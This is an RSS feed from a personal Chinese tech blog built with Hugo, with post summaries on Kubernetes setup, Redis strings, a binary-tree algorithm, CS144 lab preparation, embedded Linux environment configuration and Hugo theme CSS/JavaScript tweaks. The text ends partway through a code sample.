<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>AGA&#39;s Blog on </title>
    <link>//localhost:64783/</link>
    <description>Recent content in AGA&#39;s Blog on </description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Sun, 29 Jun 2025 15:08:13 +0800</lastBuildDate>
    <atom:link href="//localhost:64783/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Hello World</title>
      <link>//localhost:64783/posts/hello-world/</link>
      <pubDate>Wed, 18 Oct 2023 17:55:36 +0800</pubDate>
      <guid>//localhost:64783/posts/hello-world/</guid>
      <description>&lt;p&gt;Welcome to AGA&amp;rsquo;s Blog. This is my first post.&lt;/p&gt;&#xA;&lt;p&gt;For more information about this theme, check the documentation: &lt;a href=&#34;https://stack.jimmycai.com/&#34;&gt;https://stack.jimmycai.com/&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>告别单节点：使用 Multipass &#43; k3s 搭建本地多节点 K8s 集群</title>
      <link>//localhost:64783/post/say-goodbye-to-single-node-use-multipass-k3s-to-build-a-local-multinode-k8s-cluster-1gako2.html</link>
      <pubDate>Sun, 29 Jun 2025 15:02:11 +0800</pubDate>
      <guid>//localhost:64783/post/say-goodbye-to-single-node-use-multipass-k3s-to-build-a-local-multinode-k8s-cluster-1gako2.html</guid>
      <description>&lt;h1 id=&#34;告别单节点使用-multipass--k3s-搭建本地多节点-k8s-集群&#34;&gt;告别单节点：使用 Multipass + k3s 搭建本地多节点 K8s 集群&lt;/h1&gt;&#xA;&lt;p&gt;在上一篇文章中，我们介绍了如何使用 Minikube 快速搭建一个单节点的 Kubernetes 环境。Minikube 无疑是入门学习和简单应用测试的绝佳工具，但当我们需要模拟更真实的生产场景，例如测试高可用性、网络策略或多节点调度时，单节点的局限性就显现出来了。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Minikube 入门指南：在本地轻松搭建你的第一个 Kubernetes 集群</title>
      <link>//localhost:64783/post/minikube-getting-started-guide-easily-build-your-first-kubernetes-cluster-locally-1wa8ot.html</link>
      <pubDate>Sun, 29 Jun 2025 01:44:30 +0800</pubDate>
      <guid>//localhost:64783/post/minikube-getting-started-guide-easily-build-your-first-kubernetes-cluster-locally-1wa8ot.html</guid>
      <description>&lt;h1 id=&#34;minikube-入门指南在本地轻松搭建你的第一个-kubernetes-集群&#34;&gt;Minikube 入门指南：在本地轻松搭建你的第一个 Kubernetes 集群&lt;/h1&gt;&#xA;&lt;p&gt;想要学习和使用 Kubernetes (K8s)，但被生产环境复杂的集群搭建流程劝退？别担心，对于开发者和学习者来说，我们有一个完美的工具——&lt;strong&gt;Minikube&lt;/strong&gt;。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Kubernetes 架构深度解析：Master 与 Worker 节点全景</title>
      <link>//localhost:64783/post/kubernetes-architecture-indepth-analysis-panoramic-view-of-master-and-worker-nodes-zeh0mz.html</link>
      <pubDate>Sun, 29 Jun 2025 00:15:40 +0800</pubDate>
      <guid>//localhost:64783/post/kubernetes-architecture-indepth-analysis-panoramic-view-of-master-and-worker-nodes-zeh0mz.html</guid>
      <description>&lt;h1 id=&#34;kubernetes-架构深度解析master-与-worker-节点全景&#34;&gt;Kubernetes 架构深度解析：Master 与 Worker 节点全景&lt;/h1&gt;&#xA;&lt;p&gt;Kubernetes (K8s) 采用经典的 &lt;strong&gt;Master-Worker&lt;/strong&gt; 架构。其中，&lt;strong&gt;Master 节点&lt;/strong&gt;（主节点）负责管理和控制整个集群，而 &lt;strong&gt;Worker 节点&lt;/strong&gt;（工作节点）则负责运行实际的应用程序和服务。&lt;/p&gt;</description>
    </item>
    <item>
      <title>从 Pod 到 StatefulSet：一文读懂 Kubernetes 核心组件</title>
      <link>//localhost:64783/post/from-pod-to-statefulset-understanding-kubernetes-core-components-in-one-article-zadm4x.html</link>
      <pubDate>Sun, 29 Jun 2025 00:13:38 +0800</pubDate>
      <guid>//localhost:64783/post/from-pod-to-statefulset-understanding-kubernetes-core-components-in-one-article-zadm4x.html</guid>
      <description>&lt;h1 id=&#34;从-pod-到-statefulset一文读懂-kubernetes-核心组件&#34;&gt;从 Pod 到 StatefulSet：一文读懂 Kubernetes 核心组件&lt;/h1&gt;&#xA;&lt;p&gt;刚接触 Kubernetes (K8s) 时，你可能会被其众多的组件和概念搞得眼花缭乱。但别担心，只要理解了其核心设计思想，一切都会变得清晰起来。本文将带你从最基本的计算单元开始，层层递进，逐步揭开 K8s 的神秘面纱。&lt;/p&gt;&#xA;&lt;h2 id=&#34;1-node--podkubernetes-的基本计算单元&#34;&gt;1. Node &amp;amp; Pod：Kubernetes 的基本计算单元&lt;/h2&gt;&#xA;&lt;h3 id=&#34;node集群的基石&#34;&gt;Node：集群的基石&lt;/h3&gt;&#xA;&lt;p&gt;在 K8s 的世界里，&lt;strong&gt;Node&lt;/strong&gt; 是最基础的计算资源。你可以简单地将一个 Node 理解为一台服务器，无论它是物理机还是虚拟机。整个 K8s 集群就是由一个或多个这样的 Node 组成的。&lt;/p&gt;&#xA;&lt;h3 id=&#34;pod最小的调度单元&#34;&gt;Pod：最小的调度单元&lt;/h3&gt;&#xA;&lt;p&gt;K8s 并不直接调度单个容器，而是调度一个更高层次的抽象——&lt;strong&gt;Pod&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Pod 是 K8s 中最小的部署和调度单元&lt;/strong&gt;。&lt;/li&gt;&#xA;&lt;li&gt;一个 Pod 包含一个或多个紧密协作的容器。这些容器共享同一个网络命名空间（即共享同一个 IP 地址和端口空间）、存储卷以及运行配置。&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img src=&#34;//localhost:64783/images/image-20250628214006-z18s8il.png&#34; alt=&#34;Node 与 Pod 的关系&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;虽然一个 Pod 可以运行多个容器，但最佳实践是 &lt;strong&gt;“一个 Pod，一个主容器”&lt;/strong&gt; 。只有当容器之间高度耦合，需要共享资源才能完成特定功能时，才考虑将它们放在同一个 Pod 中。一个典型的例子就是 &lt;strong&gt;Sidecar（边车）模式&lt;/strong&gt;：&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;Sidecar 模式&lt;/strong&gt;：将一个辅助容器（Sidecar）与主应用容器部署在同一个 Pod 中。Sidecar 负责处理日志收集、监控、网络代理等辅助任务，从而让主应用容器更专注于核心业务逻辑。&lt;/p&gt;&lt;/blockquote&gt;&#xA;&lt;p&gt;&lt;img src=&#34;//localhost:64783/images/image-20250628214423-s8n3hab.png&#34; alt=&#34;Sidecar 模式示意图&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;2-service为-pod-提供稳定的访问入口&#34;&gt;2. Service：为 Pod 提供稳定的访问入口&lt;/h2&gt;&#xA;&lt;p&gt;Pod 在创建时会被 K8s 自动分配一个集群内部的 IP 地址。Pod 之间可以通过这个 IP 直接通信。然而，这带来了两个棘手的问题：&lt;/p&gt;</description>
    </item>
    <item>
      <title>动态字符串SDS</title>
      <link>//localhost:64783/post/dynamic-string-sds-7ahiw.html</link>
      <pubDate>Wed, 28 May 2025 10:19:34 +0800</pubDate>
      <guid>//localhost:64783/post/dynamic-string-sds-7ahiw.html</guid>
      <description>&lt;h1 id=&#34;动态字符串sds&#34;&gt;动态字符串SDS&lt;/h1&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;title: &amp;ldquo;{{ replace .Title &amp;ldquo;your-title&amp;rdquo; &amp;ldquo;default-title&amp;rdquo; }}&amp;rdquo;&lt;br&gt;&#xA;date: {{ now.Format &amp;ldquo;2006-01-02T15:04:01+08:00&amp;rdquo; }}  # 自动生成当前时间&lt;br&gt;&#xA;image: &amp;ldquo;/images/your-image.jpg&amp;rdquo;  # 可选：图片路径&lt;br&gt;&#xA;math: false  # 是否启用数学公式（如 LaTeX）&lt;br&gt;&#xA;license: &amp;ldquo;CC BY-SA 4.0&amp;rdquo;  # 许可协议（可选）&lt;br&gt;&#xA;hidden: false  # 是否隐藏文章&lt;br&gt;&#xA;comments: true  # 是否启用评论&lt;br&gt;&#xA;draft: false  # 是否为草稿（true 时不生成）&lt;br&gt;&#xA;categories:&lt;br&gt;&#xA;- &amp;ldquo;redis源码解析&amp;rdquo;&lt;br&gt;&#xA;tags:&lt;br&gt;&#xA;- &amp;ldquo;中间件源码学习&amp;rdquo;&lt;br&gt;&#xA;- &amp;ldquo;redis&amp;rdquo;&lt;/p&gt;</description>
    </item>
    <item>
      <title>二叉树的最近公共祖先</title>
      <link>//localhost:64783/post/the-nearest-public-ancestor-of-binary-trees-z26lamx.html</link>
      <pubDate>Wed, 14 May 2025 23:22:23 +0800</pubDate>
      <guid>//localhost:64783/post/the-nearest-public-ancestor-of-binary-trees-z26lamx.html</guid>
      <description>&lt;h1 id=&#34;二叉树的最近公共祖先&#34;&gt;二叉树的最近公共祖先&lt;/h1&gt;&#xA;&lt;p&gt;‍&lt;/p&gt;&#xA;&lt;h2 id=&#34;-问题描述&#34;&gt;🧠 问题描述：&lt;/h2&gt;&#xA;&lt;p&gt;给定一棵二叉树的根节点 &lt;code&gt;root&lt;/code&gt;​ 和两个节点 &lt;code&gt;p&lt;/code&gt;​ 和 &lt;code&gt;q&lt;/code&gt;​，请找出它们的 &lt;strong&gt;最近公共祖先节点&lt;/strong&gt;。&lt;/p&gt;&#xA;&lt;p&gt;公共祖先定义为：在树中，某个节点是 &lt;code&gt;p&lt;/code&gt;​ 和 &lt;code&gt;q&lt;/code&gt;​ 的祖先（包括自己），并且离它们尽可能近。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Check0</title>
      <link>//localhost:64783/posts/cs144/check0/</link>
      <pubDate>Fri, 29 Mar 2024 14:16:37 +0800</pubDate>
      <guid>//localhost:64783/posts/cs144/check0/</guid>
      <description>&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;&#xA;&lt;p&gt;其实从本科开始，计网相关的课上了也有三次：第一次是大二在CQU上的，当时用的自顶向下那本书，一上来方老师就无敌催眠，不过是开卷考试，最后面向考试临时复习也拿了90+；第二次是考研的时候看的湖科大的网课，说实话这个老师动画做的很好，每个知识点好像都听懂了，但是还是没有形成成套的系统；第三次是在USTC上的高级计算机网络，上学期选这门课的时候，还是抱着一种想学东西的心态去听的，毕竟选的时候就听过这门课很硬核。遗憾的是，尝试听了一两节课后还是放弃了。机缘巧合之下，看到了cs144的lab，想给自己立一个新坑，这个学期搓出来cs144。计网的概念实在是玄乎又不好理解，或许换种方式，试试自己动手写写，顺便尝试读读英文文档（当然还是会借助一下翻译器），话不多说，cs144，启动！&lt;/p&gt;&#xA;&lt;p&gt;前面都是一些配置相关废话，正式写代码请看[[#3.4 Writing webget]]&lt;/p&gt;&#xA;&lt;h2 id=&#34;1-set-up-gnulinux-on-your-computer&#34;&gt;1 Set up GNU/Linux on your computer&lt;/h2&gt;&#xA;&lt;p&gt;文档中给出了几种环境的安装方式&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Recommended: Install the CS144 VirtualBox virtual-machine image (instructions at &lt;a href=&#34;https://stanford.edu/class/cs144/vm&#34;&gt;https://stanford.edu/class/cs144/vm&lt;/a&gt; howto/vm-howto-image.html).&lt;/li&gt;&#xA;&lt;li&gt;Use a Google Cloud virtual machine using our class’s coupon code (instructions at &lt;a href=&#34;https://stanford.edu/class/cs144/vm&#34;&gt;https://stanford.edu/class/cs144/vm&lt;/a&gt; howto).&lt;/li&gt;&#xA;&lt;li&gt;Run Ubuntu version 23.10, then install the required packages: sudo apt update &amp;amp;&amp;amp; sudo apt install git cmake gdb build-essential clang \clang-tidy clang-format gcc-doc pkg-config glibc-doc tcpdump tshark&lt;/li&gt;&#xA;&lt;li&gt;Use another GNU/Linux distribution, but be aware that you may hit roadblocks along the way and will need to be comfortable debugging them. Your code will be tested on Ubuntu 23.10 LTS with g++ 13.2 and must compile and run properly under those conditions.&lt;/li&gt;&#xA;&lt;li&gt;If you have a 2020–24 MacBook (with the ARM64 M1/M2/M3 chips), VirtualBox will not successfully run. Instead, please install the UTM virtual machine software and our ARM64 virtual machine image from &lt;a href=&#34;https://stanford.edu/class/cs144/vm&#34;&gt;https://stanford.edu/class/cs144/vm&lt;/a&gt; howto/.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;我是MAC系统所以就按第五种进行虚拟机的安装（上学期已经被折磨过一次）&lt;/p&gt;</description>
    </item>
    <item>
      <title>环境配置</title>
      <link>//localhost:64783/posts/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%AD%A6%E4%B9%A0/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Fri, 29 Mar 2024 14:13:47 +0800</pubDate>
      <guid>//localhost:64783/posts/%E5%B5%8C%E5%85%A5%E5%BC%8F%E5%AD%A6%E4%B9%A0/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</guid>
      <description>&lt;h2 id=&#34;简介&#34;&gt;简介&lt;/h2&gt;&#xA;&lt;p&gt;发现自己很久没更新博客了（没错是在摆），课题组要整新的工作，不得不开学嵌入式，话不多说开始！&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Mac 主机上一般的日常开发流程为&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;在 Mac 上阅读修改代码（VSCode），融合模式下使用 Windows 上 SourceInsight 阅读修改代码，然后通过 共享目录把代码传到 Parallel Desktop 中的 Ubuntu；&lt;/li&gt;&#xA;&lt;li&gt;在 Ubuntu 上编译程序；&lt;/li&gt;&#xA;&lt;li&gt;把程序下载到开发板上,运行验证；&lt;/li&gt;&#xA;&lt;li&gt;在 Mac 下通过串口/网络操作开发板。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;ubuntu&#34;&gt;ubuntu&lt;/h2&gt;&#xA;&lt;h3 id=&#34;安装pd虚拟机&#34;&gt;安装pd虚拟机&lt;/h3&gt;&#xA;&lt;p&gt;直接&lt;a href=&#34;https://www.parallelsdesktop.net/parallels-desktop/&#34;&gt;官网&lt;/a&gt;安装就行&lt;/p&gt;&#xA;&lt;h3 id=&#34;镜像安装&#34;&gt;镜像安装&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;在这里我选择的是在&lt;a href=&#34;http://mirrors.ustc.edu.cn&#34;&gt;USTC Open Source Software Mirror&lt;/a&gt;下安装的&lt;img src=&#34;https://raw.githubusercontent.com/Anonymity-0/Picgo/main/img/202403291107183.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;下载好之后在pd内进行安装即可&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;配置&#34;&gt;配置&lt;/h3&gt;&#xA;&lt;h4 id=&#34;在ubuntu上安装图形界面&#34;&gt;在Ubuntu上安装图形界面&lt;/h4&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt install ubuntu-desktop&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;配置中文&#34;&gt;配置中文&lt;/h4&gt;&#xA;&lt;p&gt;这一步看个人选择，如果有需要请gpt/百度&lt;/p&gt;&#xA;&lt;h4 id=&#34;nfs-服务开启&#34;&gt;&lt;strong&gt;NFS&lt;/strong&gt; 服务开启&lt;/h4&gt;&#xA;&lt;p&gt;首先新建文件夹&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir imx6ull&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;cd imx6ull&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;mkdir nfs&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;安装 nfs服务&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install nfs-kernel-server rpcbind&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;使用如下命令打开 nfs配置文件/etc/exports：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo vi /etc/exports&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;打开/etc/exports以后在后面添加如下内容：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/home/用户名/imx6ull/nfs *rw,sync,no_root_squash&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;添加完成以后，重启 NFS服务，使用命令如下：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo /etc/init.d/nfs-kernel-server restart&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;ssh-服务开启&#34;&gt;&lt;strong&gt;SSH&lt;/strong&gt; 服务开启&lt;/h4&gt;&#xA;&lt;p&gt;Ubuntu下使用如下命令开启 SSH服务：&lt;/p&gt;</description>
    </item>
    <item>
      <title>Hugo主题优化实践</title>
      <link>//localhost:64783/posts/hugo-theme-optimization/</link>
      <pubDate>Sat, 20 Jan 2024 14:30:00 +0800</pubDate>
      <guid>//localhost:64783/posts/hugo-theme-optimization/</guid>
      <description>&lt;h2 id=&#34;主题优化概述&#34;&gt;主题优化概述&lt;/h2&gt;&#xA;&lt;p&gt;Hugo是一个优秀的静态网站生成器，通过合理的优化可以获得更好的用户体验。&lt;/p&gt;&#xA;&lt;h2 id=&#34;css优化&#34;&gt;CSS优化&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 代码块样式优化 */&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;highlight&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;border-radius&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;padding&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;auto&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;box-shadow&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;px&lt;/span&gt; rgba(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0.08&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 行号样式 */&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;chroma&lt;/span&gt; .&lt;span style=&#34;color:#a6e22e&#34;&gt;ln&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;color&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;#7f7f7f&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;margin-right&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.8&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;em&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;user-select&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;none&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;javascript增强&#34;&gt;JavaScript增强&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 回到顶部功能&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;scrollToTop&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    window.&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollTo&lt;/span&gt;({&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;top&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;behavior&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;smooth&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 显示/隐藏回到顶部按钮&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;addEventListener&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scroll&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;backToTopBtn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;back-to-top&amp;#39;&lt;/span&gt;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (window.&lt;span style=&#34;color:#a6e22e&#34;&gt;pageYOffset&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;300&lt;/span&gt;) {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;backToTopBtn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;block&amp;#39;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    } &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;backToTopBtn&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;style&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;display&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;none&amp;#39;&lt;/span&gt;;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span 